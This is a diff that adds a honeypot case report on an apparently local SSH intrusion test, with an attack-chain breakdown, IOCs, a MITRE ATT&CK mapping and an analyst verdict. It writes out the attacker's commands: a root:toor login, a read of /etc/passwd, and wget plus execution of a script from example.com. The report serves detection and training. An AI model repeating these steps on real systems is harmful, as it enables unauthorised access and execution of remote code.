@@ -1,0 +1,104 @@
+==============================
+HONEYBADGER LEVEL 2B CASE REPORT
+==============================
+
+Case ID: HB-0001-LOCAL-SSH-RECON
+
+==== ATTACK CHAIN ANALYSIS ====
+
+1. Initial Access
+- Successful SSH login using weak credentials (root:toor)
+
+2. Discovery
+- whoami
+- pwd
+- uname -a
+
+3. Enumeration
+- ls
+- cat /etc/passwd
+
+4. Process Inspection
+- ps aux
+
+5. Payload Retrieval
+- wget http://example.com/test.sh
+- curl https://example.com
+
+6. Execution Attempt
+- chmod +x test.sh
+- ./test.sh
+
+7. Anomaly
+- Unexpected HTML content executed (likely from curl response)
+
+8. Session End
+- exit
+
+
+==== INDICATORS OF COMPROMISE (IOCs) ====
+
+[Source IPs]
+127.0.0.1
+
+[Credentials Used]
+root:toor
+
+[Downloaded URLs]
+http://example.com/test.sh
+https://example.com
+
+[SHA256 Hashes]
+fb91d75a6bb430787a61b0aec5e374f580030f2878e1613eab5ca6310f7bbb9a
+
+[Observed Filenames]
+test.sh
+
+
+==== MITRE ATT&CK MAPPING ====
+
+[T1110] Brute Force
+- Weak/default credential use observed: root:toor
+
+[T1078] Valid Accounts
+- Successful SSH authentication achieved
+
+[T1082] System Information Discovery
+- uname -a
+- whoami
+- pwd
+
+[T1083] File and Directory Discovery
+- ls
+- cat /etc/passwd
+
+[T1057] Process Discovery
+- ps aux
+
+[T1105] Ingress Tool Transfer
+- wget http://example.com/test.sh
+- curl https://example.com
+
+[T1059] Command and Scripting Interpreter
+- chmod +x test.sh
+- ./test.sh
+
+
+==== ANALYST VERDICT ====
+
+Severity: Low
+Confidence: High
+Attack Type: SSH Reconnaissance with Payload Retrieval and Execution Attempt
+
+Summary:
+A successful SSH login was observed using weak credentials (root:toor), followed by basic host discovery, file enumeration, process inspection, download activity, and an execution attempt.
+
+Assessment:
+The observed behavior is consistent with early-stage opportunistic attacker activity or automated post-login reconnaissance.
+
+Impact:
+No persistence, privilege escalation, lateral movement, or destructive activity was observed.
+
+Conclusion:
+This case represents a low-complexity SSH intrusion pattern suitable for detection engineering, IOC extraction, and analyst workflow training.
+
